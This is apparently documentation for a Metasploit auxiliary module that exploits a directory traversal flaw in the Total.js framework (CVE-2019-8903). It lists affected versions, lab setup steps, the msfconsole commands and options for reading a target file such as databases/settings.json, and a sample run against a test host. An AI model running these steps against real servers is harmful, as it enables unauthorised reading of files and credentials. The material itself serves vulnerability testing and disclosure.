## Description

This module check and exploits a Directory Traversal vulnerability in Total.js framework < 3.2.4 (CVE-2019-8903). Here is a list of accepted extensions: flac, jpg, jpeg, png, gif, ico, js, css, txt, xml, woff, woff2, otf, ttf, eot, svg, zip, rar, pdf, docx, xlsx, doc, xls, html, htm, appcache, manifest, map, ogv, ogg, mp4, mp3, webp, webm, swf, package, json, md, m4v, jsx, heif, heic.

## Vulnerable Application

Affecting total.js package, versions:

* >=2.1.0 <2.1.1
* >=2.2.0 <2.2.1
* >=2.3.0 <2.3.1
* >=2.4.0 <2.4.1
* >=2.5.0 <2.5.1
* >=2.6.0 <2.6.3
* >=2.7.0 <2.7.1
* >=2.8.0 <2.8.1
* >=2.9.0 <2.9.5
* >=3.0.0 <3.0.1
* >=3.1.0 <3.1.1
* >=3.2.0 <3.2.4

## Verification Steps

1. On a Node v8 environment do: `npm install total.js@3.2.3`
2. Install an app on top of the Total.js framework, something like [Total.js CMS](https://github.com/totaljs/cms)
  * `git clone https://github.com/totaljs/cms.git`
  * `cd cms && npm install`
3. Start `msfconsole`
4. `use auxiliary/scanner/http/totaljs_traversal`
5. `set RHOST <IP>`
6. `set RPORT <PORT>`
7. `run`
8. Verify you get Total.js version if the target is vulnerable!

## Options

 **DEPTH**

  Traversal depth. Default is `1`

 **FILE**

  File to obtain. Default is `databases/settings.json`

## Scenarios

### Tested on Total.js framework 3.2.0 and Total.js CMS 12.0.0

```
msf5 > use auxiliary/scanner/http/totaljs_traversal 
msf5 auxiliary(scanner/http/totaljs_traversal) > set RHOST 192.168.2.59
RHOST => 192.168.2.59
msf5 auxiliary(scanner/http/totaljs_traversal) > set RPORT 8320
RPORT => 8320
msf5 auxiliary(scanner/http/totaljs_traversal) > run
[*] Running module against 192.168.2.59

[*] Total.js version is: ^3.2.0
[*] App name: CMS
[*] App description: A simple and powerful CMS solution written in Total.js / Node.js.
[*] App version: 12.0.0
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/totaljs_traversal) >
```
